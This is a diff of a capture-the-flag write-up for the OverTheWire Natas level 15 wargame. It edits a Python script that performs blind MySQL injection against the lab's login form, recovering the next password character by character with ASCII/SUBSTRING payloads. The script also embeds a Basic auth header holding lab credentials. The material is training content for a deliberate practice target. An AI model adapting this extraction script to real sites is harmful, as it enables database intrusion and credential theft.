@@ -1,4 +1,4 @@
-# Level 15
+# Natas Level 15
 Pushing things further, this level deals with Blind SQL injection. We'll make a python script as well.
 
 ##  Quest
@@ -114,14 +114,14 @@ Below is the screenshot of discovering the second password character.
 
 We repeat this process 32 times to get the complete password for next Level.<br/><br/>It took me about an hour to smuggle password char by char with Burp community addition, so i decided to write a script to do the same, just for the fun of it.
 <br/><br/>
-This script does blind mysql injection till password is revealed
+This script does blind mysql injection till all password characters are revealed
 ```python
  1 #!/usr/bin/env python3
  2
  3 import requests
- 4 # Show have used auth, but it works for now.
+ 4 # Should have used auth, but it works for now.
  5 headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
- 6 proxy = {'http': 'http://localhost:8080'}
+ 6 
  7
  8 password = ""
  9 pos = 1
@@ -130,7 +130,7 @@ This script does blind mysql injection till password is revealed
 12     if password:
 13         payload = f'natas16" AND password = \'{password}\' ;#'
 14         data = {'username': payload}
-15         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
+15         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers)
 16         if response.status_code == 200  and "This user exists" in response.text:
 17             print(f"\r{password}", end='', flush=True)
 18             break
@@ -139,7 +139,7 @@ This script does blind mysql injection till password is revealed
 21         print(f"\r{password}{chr(i)}", end='', flush=False)
 22         payload = f'natas16" AND ASCII(SUBSTRING(password,{pos},1)) = {i};#'
 23         data = {'username': payload}
-24         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
+24         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers)
 25         if response.status_code == 200:
 26             if 'This user exists.' in response.text:
 27                 password += chr(i)
